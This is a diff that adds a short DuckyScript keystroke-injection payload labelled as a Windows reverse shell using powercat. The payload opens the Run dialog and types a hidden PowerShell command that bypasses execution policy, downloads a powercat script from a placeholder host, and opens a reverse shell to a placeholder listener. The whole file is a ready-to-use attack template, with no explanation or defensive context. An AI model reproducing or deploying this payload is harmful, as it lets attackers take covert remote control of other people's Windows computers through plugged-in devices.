@@ -1,0 +1,12 @@
+REM windows reverse shell (using powercat)
+DEFAULT_DELAY 500
+DELAY 3000
+
+REM get execute window
+GUI r
+DELAY 1000
+
+REM start reverse shell
+STRING powershell -ep bypass -c "Start-Process -FilePath \"powershell.exe\" -ArgumentList \"IEX(New-Object System.Net.WebClient).DownloadString('http://<PROVIDERIP>:<PROVIDERPORT>/<POWERCATNAME>.ps1');<POWERCATFUNCTION> -c <SHELLIP> -p <SHELLPORT> -e powershell\" -WindowStyle Hidden"
+DELAY 500
+ENTER
